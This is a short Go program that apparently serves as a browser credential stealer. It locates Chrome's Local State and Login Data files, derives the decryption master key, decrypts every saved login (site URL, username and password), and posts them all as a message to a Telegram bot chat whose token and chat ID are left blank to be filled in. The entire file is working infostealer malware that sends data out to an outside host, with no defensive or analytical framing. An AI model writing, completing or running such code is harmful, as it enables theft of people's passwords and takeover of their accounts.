package main

import (
	"fmt"
	"log"
	"GoCookies/browsers"
	"bytes"
	"net/http"
	"encoding/json"
)

const (
	botToken = "" // Replace with your Telegram bot token
	chatID   = "" // Replace with your Telegram chat ID
)

func main() {
	// Get the available Chromium-based browsers and their paths
	browsersMap := browsers.GetChromiumBrowsers()

	// Get the paths for Chrome's Local State and Login Data
	chromeLocalStatePath := browsersMap["Chrome Local State"]
	chromeLoginDataPath := browsersMap["Chrome Login Data"]

	// Ensure the paths are found
	if chromeLocalStatePath == "" || chromeLoginDataPath == "" {
		log.Fatalf("Chrome Local State or Login Data path not found in the map")
	}

	// Get the master key for decryption using the Local State file
	var chromium browsers.Chromium
	err := chromium.GetMasterKey(chromeLocalStatePath)
	if err != nil {
		log.Fatalf("Failed to get master key: %v", err)
	}

	// Get the logins (username, password, and URL) from the Login Data file
	logins, err := chromium.GetLogins(chromeLoginDataPath)
	if err != nil {
		log.Fatalf("Failed to get logins: %v", err)
	}

	// Format the login details into a string message
	var message string
	for _, login := range logins {
		message += fmt.Sprintf("URL: %s\nUsername: %s\nPassword: %s\n\n", login.LoginURL, login.Username, login.Password)
	}

	// If no logins are found, send a message stating no logins were found
	if message == "" {
		message = "No logins found."
	}

	// Send the message to Telegram
	err = sendMessageToTelegram(message)
	if err != nil {
		log.Fatalf("Failed to send message to Telegram: %v", err)
	}
}

// sendMessageToTelegram sends a message to a specified Telegram chat.
func sendMessageToTelegram(message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	payload := map[string]interface{}{
		"chat_id": chatID,
		"text":    message,
	}

	// Convert the payload to JSON
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON payload: %v", err)
	}

	// Send the POST request to Telegram's API
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send POST request to Telegram: %v", err)
	}
	defer resp.Body.Close()

	// Check if the request was successful
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("received non-OK response from Telegram API: %v", resp.Status)
	}

	log.Printf("Message sent successfully to Telegram!")
	return nil
}
